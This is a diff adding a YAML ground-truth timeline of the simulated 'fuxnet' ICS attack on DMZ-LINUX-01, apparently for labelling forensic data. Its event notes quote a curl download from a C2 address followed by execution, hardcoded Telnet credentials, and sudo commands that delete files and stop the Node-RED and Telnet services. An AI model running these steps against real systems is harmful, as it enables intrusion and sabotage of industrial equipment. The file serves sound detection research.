@@ -1,0 +1,297 @@
+attack: fuxnet
+host: DMZ-LINUX-01
+start: "2026-03-14T10:48:47Z"
+end: "2026-03-14T14:58:40Z"
+
+events:
+
+  # ── Phase 1: Initial SSH access to DMZ-LINUX-01 ─────────────────────────────
+  # Attacker authenticates as cs-admin over SSH. The sshd listener spawns a
+  # privileged child which then forks the user session and login shell.
+  # All three GUIDs confirmed in Neo4j (processName/commandLine verified).
+
+  - seq: 1
+    timestamp: "2026-03-14T10:48:47Z"
+    rel: CREATE_PROCESS
+    src: "{9cb2af7e-2d17-588e-3dbb-c874a55e63ed}"
+    dst: "{b5ae82ca-6f34-404a-5d09-56df0796eecd}"
+    technique: T0886
+    note: "Remote Services: SSH — sshd listener (pid=1499, DMZ-LINUX-01) spawns sshd privileged child (pid=1693, 'sshd: cs-admin [priv]') for the attacker's incoming connection."
+
+  - seq: 2
+    timestamp: "2026-03-14T10:48:52Z"
+    rel: CREATE_PROCESS
+    src: "{b5ae82ca-6f34-404a-5d09-56df0796eecd}"
+    dst: "{fde1afd8-7104-2c31-b92e-f17c8f4968ed}"
+    technique: T0886
+    note: "Remote Services: SSH — sshd priv (pid=1693) forks user session (pid=1827, 'sshd: cs-admin@pts/0'), establishing the attacker's interactive PTY."
+
+  - seq: 3
+    timestamp: "2026-03-14T10:48:52Z"
+    rel: CREATE_PROCESS
+    src: "{fde1afd8-7104-2c31-b92e-f17c8f4968ed}"
+    dst: "{3cf608e6-5998-5a1b-4a62-3ccec7781bcf}"
+    technique: T0886
+    note: "Remote Services: SSH — sshd user session (pid=1827) spawns cs-admin's login shell (pid=1828, cmdline='-bash'). Attack shell now active on DMZ-LINUX-01."
+
+  # ── Phase 2: SFTP tool transfer — fuxnet binary dropped to /tmp ──────────────
+  # Attacker opens a second SSH connection using sshd -D -R (accept-and-re-exec
+  # mode) to run an SFTP session, dropping the fuxnet-combined-linux-amd64
+  # binary into /tmp. The sftp-server writes the file to disk.
+
+  - seq: 4
+    timestamp: "2026-03-14T10:56:14Z"
+    rel: CREATE_PROCESS
+    src: "{9cb2af7e-2d17-588e-3dbb-c874a55e63ed}"
+    dst: "{a53e8852-65ef-2973-d2ba-b60d3ac350da}"
+    technique: T0867
+    note: "Lateral Tool Transfer — sshd listener spawns first sshd -D -R instance (pid=1893) to accept the SFTP connection used to stage the fuxnet binary."
+
+  - seq: 5
+    timestamp: "2026-03-14T10:56:34Z"
+    rel: CREATE_PROCESS
+    src: "{fbaa7a0a-4712-dab9-1f2d-c589a809c6e1}"
+    dst: "{4f5a509f-0bf4-775a-8f42-2e0a82683d25}"
+    technique: T0867
+    note: "Lateral Tool Transfer — sshd user session (cs-admin) spawns bash wrapper (pid=1956, cmdline='bash -c /usr/lib/openssh/sftp-server') to launch the SFTP subsystem."
+
+  - seq: 6
+    timestamp: "2026-03-14T10:56:34Z"
+    rel: CREATE_PROCESS
+    src: "{4f5a509f-0bf4-775a-8f42-2e0a82683d25}"
+    dst: "{130a1a5b-a2bf-2cf6-f11b-49b8730f8937}"
+    technique: T0867
+    note: "Lateral Tool Transfer — bash (pid=1956) execs sftp-server (/usr/lib/openssh/sftp-server, cs-admin) which receives and writes the fuxnet-combined-linux-amd64 binary."
+
+  - seq: 7
+    timestamp: "2026-03-14T10:56:34Z"
+    rel: CREATE_FILE
+    src: "{130a1a5b-a2bf-2cf6-f11b-49b8730f8937}"
+    dst: "{c64cf808-5ac9-da9c-f91b-74bf31ab26e4}"
+    technique: T0867
+    note: "Lateral Tool Transfer — sftp-server writes fuxnet-combined-linux-amd64 binary to disk on DMZ-LINUX-01 (image resolves to /tmp/fuxnet-combined-linux-amd64 at execution time)."
+
+  # ── Phase 3: chmod + first fuxnet execution (-delay 2h -debug) ───────────────
+  # Attacker's second interactive login shell (pid=2010) makes the binary
+  # executable then launches fuxnet-combined-linux-amd64 with -delay 2h -debug.
+  # The binary immediately initiates SSH connections to FT-GW-01, FT-RPI-01,
+  # FT-HMI-01, an HTTP probe to FT-ROUTER, and an OPC UA connection to SCADA-01.
+
+  - seq: 8
+    timestamp: "2026-03-14T10:57:12Z"
+    rel: CREATE_PROCESS
+    src: "{05964bab-49a5-b196-082e-aff4a58cb0d7}"
+    dst: "{8e8476d9-da7b-54e8-89e9-a3f3f4c49f30}"
+    technique: T0863
+    note: "User Execution — cs-admin bash (pid=2010, '-bash') spawns chmod (pid=2027, cmdline='chmod +x fuxnet-combined-linux-amd64'), making the SFTP-dropped binary executable."
+
+  - seq: 9
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CREATE_PROCESS
+    src: "{05964bab-49a5-b196-082e-aff4a58cb0d7}"
+    dst: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    technique: T0863
+    note: "User Execution — cs-admin bash (pid=2010) launches fuxnet-combined-linux-amd64 (pid=2028, image=/tmp/fuxnet-combined-linux-amd64, cmdline='./fuxnet-combined-linux-amd64 -delay 2h -debug'). Source: cmd/combined/main.go. Three phases: Phase 1 (SSH recon + network scan) runs immediately; Phase 2 (binary download + remote exec) at +2h; Phase 3 (Telnet destruction) at +4h."
+
+  - seq: 10
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{b9b9f339-7380-a042-7b66-9e49c912a92a}"
+    technique: T0886
+    note: "Remote Services: SSH — Phase 1: fuxnet-combined SSH-connects to FT-GW-01 port 22 (pivot host 172.16.142.12, hardcoded creds cs-admin) and executes 'ip addr show && echo --- && ip route' for network interface enumeration. Source: cmd/combined/main.go executeSSHStep('SSH to Pivot - Network Scan')."
+
+  - seq: 11
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{817f9b6c-be4d-e457-0f15-af9a2a1ab040}"
+    technique: T0843
+    note: "Network Scanning — Phase 1: fuxnet-combined TCP connect-scans telnet target (192.168.0.5=FT-RPI-01) on port 22 as part of service discovery port list [22,23,25,53,80,443,445,1880,...,502,102]. Source: cmd/combined/main.go executeScanStep('Service Discovery - Telnet Target')."
+
+  - seq: 12
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{b05bea9b-aba2-bfc8-dc9f-66f67bef8373}"
+    technique: T0843
+    note: "Network Scanning — Phase 1: fuxnet-combined network discovery of 192.168.0.0/24 via executeDiscoveryStep finds FT-HMI-01 and probes port 22. Source: cmd/combined/main.go executeDiscoveryStep('Network Discovery - 192.168.0.0/24')."
+
+  - seq: 13
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{eb858ca7-5632-b3b6-474c-2b1976347627}"
+    technique: T0843
+    note: "Network Scanning — Phase 1: fuxnet-combined network discovery of 192.168.0.0/24 finds FT-ROUTER and probes port 80. Source: cmd/combined/main.go executeDiscoveryStep('Network Discovery - 192.168.0.0/24')."
+
+  - seq: 14
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{8f844dd1-57ef-27e6-a116-49f067c6c2f6}"
+    technique: T0843
+    note: "Network Scanning — Phase 1: fuxnet-combined full-profile port scan of telnet target (executeScanStep 'full' profile) reaches SCADA-01 port 62541 (OPC UA). No OPC UA protocol code exists in the binary (confirmed by source); this is a TCP connect-scan hit. Source: cmd/combined/main.go executeScanStep('Port Scan Telnet Target', 'full')."
+
+  # ── Phase 3b: Network reconnaissance ────────────────────────────────────────
+  # Immediately after launching fuxnet, the attacker runs ip addr/route recon
+  # from a remote exec SSH session.
+
+  - seq: 15
+    timestamp: "2026-03-14T10:57:46Z"
+    rel: CREATE_PROCESS
+    src: "{b207edf5-271d-b36b-70ae-c51ec97943b0}"
+    dst: "{39a4de86-0e65-75ba-282d-7aab43184baf}"
+    technique: T0846
+    note: "Remote System Discovery — sshd session spawns bash (pid=2093, cmdline='bash -c ip addr show && echo --- && ip route') enumerating network interfaces and routing table on DMZ-LINUX-01."
+
+  # ── Phase 4: Second fuxnet download from C2 server (58.16.10.16) ─────────────
+  # Approx 2 hours after initial launch (matching the -delay 2h flag), attacker
+  # downloads a fresh copy of fuxnet-combined-linux-amd64 from C2 58.16.10.16,
+  # renames it fuxnet-linux-amd64, makes it executable, and fingerprints it.
+
+  - seq: 16
+    timestamp: "2026-03-14T10:56:20Z"
+    rel: CREATE_PROCESS
+    src: "{9cb2af7e-2d17-588e-3dbb-c874a55e63ed}"
+    dst: "{7b506fc8-973a-0012-cb31-548ef4be977f}"
+    technique: T0867
+    note: "Lateral Tool Transfer — sshd listener spawns second sshd -D -R instance (pid=1895) for attacker's SFTP/remote-exec channel used in subsequent download phase."
+
+  - seq: 17
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{34f84ba5-e30c-ce37-16fa-94294230f8bd}"
+    dst: "{d5c1d7fd-aae7-fa61-a578-c63730aa0b4b}"
+    technique: T0867
+    note: "Lateral Tool Transfer — fuxnet-combined Phase 2 (+2h from start = 12:57:45, matching 12:58:39 timestamp) SSHes to pivot host and executes the download one-liner: 'cd /tmp && curl -v -o fuxnet-linux-amd64 http://58.16.10.16/fuxnet-combined-linux-amd64 ...'. bash (pid=2379) spawned on DMZ-LINUX-01. Source: cmd/combined/main.go Phase 2 downloadCmd via executeSSHStep('Download Binary from Server')."
+
+  - seq: 18
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{d5c1d7fd-aae7-fa61-a578-c63730aa0b4b}"
+    dst: "{cca67c4e-187a-771e-4485-8ce774c1394c}"
+    technique: T0867
+    note: "Lateral Tool Transfer — bash (pid=2379) spawns curl (pid=2381, cmdline='curl -v -o fuxnet-linux-amd64 http://58.16.10.16/fuxnet-combined-linux-amd64') fetching the binary from the attacker C2."
+
+  - seq: 19
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CONNECT_TO
+    src: "{cca67c4e-187a-771e-4485-8ce774c1394c}"
+    dst: "{b8baf34e-25b4-7d64-e8d9-6a96a9533e11}"
+    technique: T0867
+    note: "Lateral Tool Transfer — curl connects to C2 server 58.16.10.16 port 80 (HTTP) to download fuxnet-combined-linux-amd64 payload."
+
+  - seq: 20
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_FILE
+    src: "{cca67c4e-187a-771e-4485-8ce774c1394c}"
+    dst: "{b1df1f9e-e177-ebb1-fb7b-a5ba084eb418}"
+    technique: T0867
+    note: "Lateral Tool Transfer — curl writes downloaded binary to /tmp/fuxnet-linux-amd64 on DMZ-LINUX-01."
+
+  - seq: 21
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{d5c1d7fd-aae7-fa61-a578-c63730aa0b4b}"
+    dst: "{c5487d37-fad1-a67f-889f-e621a4b73f08}"
+    technique: T0863
+    note: "User Execution — bash (pid=2379) spawns chmod (pid=2383, cmdline='chmod +x /tmp/fuxnet-linux-amd64'), making the newly downloaded binary executable."
+
+  # ── Phase 5: Second fuxnet execution (-telnet-only) ──────────────────────────
+  # A new attacker SSH session directly runs fuxnet-linux-amd64 in telnet-only
+  # mode, targeting FT-RPI-01 on port 23 (Telnet) — the fischertechnik Raspberry
+  # Pi that publishes ICS signals to FT-HMI-01 and FT-PLC-01.
+
+  - seq: 22
+    timestamp: "2026-03-14T14:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{9cb2af7e-2d17-588e-3dbb-c874a55e63ed}"
+    dst: "{517007fc-871e-851f-e4b8-a42b6bb22bc7}"
+    technique: T0886
+    note: "Remote Services: SSH — sshd listener spawns sshd -D -R (pid=2517) for the third attacker connection at 14:58:39, used to execute fuxnet-linux-amd64 -telnet-only."
+
+  - seq: 23
+    timestamp: "2026-03-14T14:58:40Z"
+    rel: CREATE_PROCESS
+    src: "{a0beda46-5806-b88b-c57e-92e71f1edc15}"
+    dst: "{2f4465aa-a392-27f1-c80d-c39d072b9dd7}"
+    technique: T0863
+    note: "User Execution — attacker SSH session spawns bash (pid=2620, cmdline='bash -c /tmp/fuxnet-linux-amd64 -delay 2h0m0s -telnet-only') as wrapper for the second fuxnet execution."
+
+  - seq: 24
+    timestamp: "2026-03-14T14:58:40Z"
+    rel: CREATE_PROCESS
+    src: "{2f4465aa-a392-27f1-c80d-c39d072b9dd7}"
+    dst: "{79eec142-84f1-8530-6150-6e163527a99d}"
+    technique: T0863
+    note: "User Execution — bash (pid=2620) executes /tmp/fuxnet-linux-amd64 (pid=2621, cmdline='/tmp/fuxnet-linux-amd64 -delay 2h0m0s -telnet-only'). This variant targets legacy Telnet-exposed devices."
+
+  - seq: 25
+    timestamp: "2026-03-14T14:58:40Z"
+    rel: CONNECT_TO
+    src: "{79eec142-84f1-8530-6150-6e163527a99d}"
+    dst: "{66621c25-e566-0db6-5fa3-297f08a98b01}"
+    technique: T0886
+    note: "Remote Services: Telnet — fuxnet-linux-amd64 (-telnet-only = Phase 3 only) connects to FT-RPI-01 port 23 as pi/ft-IOTpi2. Source cmd/combined/main.go Phase 3 executes 7 commands in sequence: (1) whoami, (2) systemctl status nodered.service, (3) hostname && uptime, (4) echo 'ft-IOTpi2' | sudo -S rm -rf /etc/inetd.d.bak, (5) echo 'ft-IOTpi2' | sudo -S rm -rf /etc/inetd.conf.bak, (6) echo 'ft-IOTpi2' | sudo -S systemctl stop nodered.service [ICS IMPACT: kills Node-RED signal publisher], (7) echo 'ft-IOTpi2' | sudo -S systemctl stop inetutils-inetd.service [kills Telnet daemon itself]. Phase delays of 5s between steps."
+
+  # ── Phase 3 supplement: directory listing after SFTP drop ───────────────────
+  # Before running chmod, the attacker ran `ls` to confirm the SFTP-dropped
+  # binary landed in the working directory.
+
+  - seq: 26
+    timestamp: "2026-03-14T10:57:00Z"
+    rel: CREATE_PROCESS
+    src: "{05964bab-49a5-b196-082e-aff4a58cb0d7}"
+    dst: "{e952c87b-2de6-ae4f-8b58-289105e5fee2}"
+    technique: T0846
+    note: "Remote System Discovery — cs-admin bash (pid=2010) spawns ls (cmdline='ls --color=auto') to list working directory contents, confirming fuxnet-combined-linux-amd64 was dropped successfully via SFTP."
+
+  # ── Phase 3b supplement: ip addr show child process ─────────────────────────
+
+  - seq: 27
+    timestamp: "2026-03-14T10:57:46Z"
+    rel: CREATE_PROCESS
+    src: "{39a4de86-0e65-75ba-282d-7aab43184baf}"
+    dst: "{4fe717f4-4a7e-16bd-f813-1631b1f337ff}"
+    technique: T0846
+    note: "Remote System Discovery — recon bash (pid=2093) spawns ip (cmdline='ip addr show') to enumerate network interfaces on DMZ-LINUX-01."
+
+  # ip route runs in the outer SSH session (shell parsing splits the one-liner)
+  - seq: 28
+    timestamp: "2026-03-14T10:57:46Z"
+    rel: CREATE_PROCESS
+    src: "{b207edf5-271d-b36b-70ae-c51ec97943b0}"
+    dst: "{2d8a91b4-b053-9de0-907a-ddc32503af8d}"
+    technique: T0846
+    note: "Remote System Discovery — parent SSH session {b207edf5} directly spawns ip (cmdline='ip route') — route table enumeration from the outer shell context of 'bash -c ip addr show && echo --- && ip route'."
+
+  # ── Phase 3 supplement: fuxnet-combined network scan hits Velociraptor ───────
+
+  - seq: 29
+    timestamp: "2026-03-14T10:57:45Z"
+    rel: CONNECT_TO
+    src: "{bbacb515-ac7e-8f2e-4023-62da9dba7a8c}"
+    dst: "{3f5e8cfe-d94e-4b49-30a6-407d539d3061}"
+    technique: T0846
+    note: "Remote System Discovery — fuxnet-combined probes Velociraptor DFIR server port 8000 (HTTP) during network scan. Discovery of the DFIR infrastructure is an incidental scan result from fuxnet's host enumeration phase."
+
+  # ── Phase 4 supplement: binary verification after download ──────────────────
+
+  - seq: 30
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{d5c1d7fd-aae7-fa61-a578-c63730aa0b4b}"
+    dst: "{29e22217-dfdd-3c2c-deff-6bf70a853bab}"
+    technique: T0867
+    note: "Lateral Tool Transfer — download bash spawns ls (pid=2382, cmdline='ls -la /tmp/fuxnet-linux-amd64') to verify the downloaded binary exists and check its size."
+
+  - seq: 31
+    timestamp: "2026-03-14T12:58:39Z"
+    rel: CREATE_PROCESS
+    src: "{d5c1d7fd-aae7-fa61-a578-c63730aa0b4b}"
+    dst: "{a4d639f9-2482-1c32-b1da-94f285139d33}"
+    technique: T0867
+    note: "Lateral Tool Transfer — download bash spawns file (pid=2384, cmdline='file /tmp/fuxnet-linux-amd64') to fingerprint the binary ELF type before execution."
+
+
